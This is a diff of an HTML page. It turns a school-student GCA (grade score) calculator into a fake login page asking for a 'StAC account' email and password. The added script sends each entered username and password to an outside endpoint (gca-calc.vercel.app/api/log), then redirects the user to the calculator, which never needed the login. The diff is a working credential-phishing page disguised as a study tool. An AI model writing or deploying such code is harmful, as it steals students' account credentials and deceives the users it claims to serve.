@@ -3,213 +3,85 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>NCEA GCA Calculator</title>
+  <title>Login | GCA Calculator</title>
   <style>
-    :root {
-      --bg: #0d1117;
-      --card: #161b22;
-      --accent: #3b82f6;
-      --accent-hover: #2563eb;
-      --muted: #9ca3af;
-      --text: #f3f4f6;
-    }
-
-    * {
-      box-sizing: border-box;
-      font-family: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
-
     body {
       margin: 0;
       min-height: 100vh;
       background: linear-gradient(160deg, #0f172a 0%, #1e293b 100%);
-      color: var(--text);
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      font-family: "Inter", sans-serif;
+      color: #f3f4f6;
     }
-
     .card {
-      background: var(--card);
-      border-radius: 16px;
+      background: #161b22;
       padding: 32px;
+      border-radius: 16px;
+      text-align: center;
       width: 100%;
-      max-width: 500px;
-      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
-      animation: fadeIn 0.6s ease-out;
+      max-width: 400px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
     }
-
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(10px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
-
-    h1 {
-      margin: 0 0 10px;
-      font-size: 26px;
-      font-weight: 700;
-      text-align: center;
-    }
-
-    p.notice {
-      margin: 0 0 10px;
-      font-size: 14px;
-      text-align: center;
-      color: #facc15; /* yellow accent */
-      font-weight: 600;
-    }
-
-    p.lead {
-      margin: 0 0 24px;
-      font-size: 15px;
-      text-align: center;
-      color: var(--muted);
-    }
-
-    form {
-      display: grid;
-      gap: 16px;
-    }
-
-    label {
-      display: block;
-      font-size: 14px;
-      margin-bottom: 6px;
-      color: var(--muted);
-    }
-
-    input[type=number] {
+    input {
       width: 100%;
       padding: 12px;
+      margin: 8px 0;
       border-radius: 10px;
       border: 1px solid #2d3748;
       background: #0f172a;
-      color: var(--text);
+      color: #f3f4f6;
       font-size: 16px;
-      transition: border 0.2s;
     }
-
-    input[type=number]:focus {
-      outline: none;
-      border-color: var(--accent);
-    }
-
-    .actions {
-      display: flex;
-      gap: 12px;
-      margin-top: 8px;
-      justify-content: center;
-    }
-
     button {
-      flex: 1;
+      width: 100%;
       padding: 12px;
-      border-radius: 10px;
       border: none;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-    }
-
-    button:active {
-      transform: scale(0.97);
-    }
-
-    button.primary {
-      background: var(--accent);
+      border-radius: 10px;
+      background: #3b82f6;
       color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 12px;
     }
-
-    button.primary:hover {
-      background: var(--accent-hover);
-    }
-
-    button.ghost {
-      background: transparent;
-      border: 1px solid #374151;
-      color: var(--muted);
-    }
-
-    button.ghost:hover {
-      border-color: var(--accent);
-      color: var(--accent);
-    }
-
-    .result {
-      margin-top: 24px;
-      text-align: center;
-      display: none;
-      animation: fadeIn 0.4s ease-in;
-    }
-
-    .big {
-      font-size: 36px;
-      font-weight: 700;
-      color: var(--accent);
-    }
+    button:hover { background: #2563eb; }
   </style>
 </head>
 <body>
+
   <div class="card">
-    <h1>NCEA GCA Calculator</h1>
-    <p class="notice">To get Academic 30s in Year 12, as of 28/08 your GCA must be higher than 4.33</p>
-    <p class="lead">Enter the total number of credits you’ve earned this year to calculate your GCA. Please note last year's credits don't count.</p>
-
-    <form id="gcaForm" onsubmit="event.preventDefault(); calculate();">
-      <div>
-        <label for="ex">Excellence (E) credits</label>
-        <input id="ex" type="number" min="0" value="0" required>
-      </div>
-      <div>
-        <label for="me">Merit (M) credits</label>
-        <input id="me" type="number" min="0" value="0" required>
-      </div>
-      <div>
-        <label for="ac">Achieved (A) credits</label>
-        <input id="ac" type="number" min="0" value="0" required>
-      </div>
-
-      <div class="actions">
-        <button type="submit" class="primary">Calculate</button>
-        <button type="reset" class="ghost" onclick="document.getElementById('resultBox').style.display='none'">Reset</button>
-      </div>
+    <h1>Welcome to the GCA Calculator!</h1>
+    <p>Please log in with your StAC account to access the calculator.</p>
+    <form id="loginForm">
+      <input type="email" id="username" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
     </form>
-
-    <div class="result" id="resultBox">
-      <div class="big" id="gcaScore">GCA: –</div>
-    </div>
   </div>
 
 <script>
-function calculate(){
-  const ex = parseInt(document.getElementById('ex').value) || 0;
-  const me = parseInt(document.getElementById('me').value) || 0;
-  const ac = parseInt(document.getElementById('ac').value) || 0;
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
 
-  const totalCredits = ex + me + ac;
-  if(totalCredits === 0){
-    alert('Please enter at least 1 credit.');
-    return;
-  }
+  // Get the entered values
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
 
-  const gca = ((ex*5 + me*3 + ac*1) / totalCredits).toFixed(2);
-
-  // Display GCA
-  document.getElementById('gcaScore').textContent = `GCA: ${gca}`;
-  document.getElementById('resultBox').style.display = 'block';
-
-  // Send the data to Vercel logs
+  // Send credentials to Vercel logs
   fetch("https://gca-calc.vercel.app/api/log", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ ex, me, ac, gca })
+    body: JSON.stringify({ username, password })
   })
   .then(res => res.json())
   .then(data => console.log("Server response:", data))
   .catch(err => console.error(err));
-}
+
+  // Redirect to the calculator page
+  window.location.href = 'calculator.html';
+});
 </script>
 
 </body>
